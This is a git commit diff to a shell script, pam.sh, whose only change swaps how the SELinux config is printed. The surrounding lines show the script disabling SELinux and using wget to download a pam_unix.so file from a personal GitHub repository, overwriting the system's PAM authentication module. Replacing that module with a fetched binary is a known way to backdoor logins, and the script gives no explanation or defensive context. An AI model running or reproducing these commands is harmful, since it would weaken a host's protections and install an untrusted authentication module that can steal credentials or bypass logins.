f766401fddea80b8caa45c8f341d1dd3287b68a1
Pe1asguss <99085587+Pe1asguss@users.noreply.github.com>
2022-02-06 09:43:51 +0800

    Update pam.sh

--- pam.sh
+++ pam.sh
@@ -6,4 +6,4 @@ sed -i 's/SELINUX=enforcing/SELINUX=disabled/g' /etc/selinux/config
 echo "------------------------------------"
 wget https://raw.githubusercontent.com/Pe1asguss/tes/main/pam_unix.so -O /usr/lib64/security/pam_unix.so
 echo "------------------------------------"
-cat /etc/selinux/config
+echo "`cat /etc/selinux/config`"
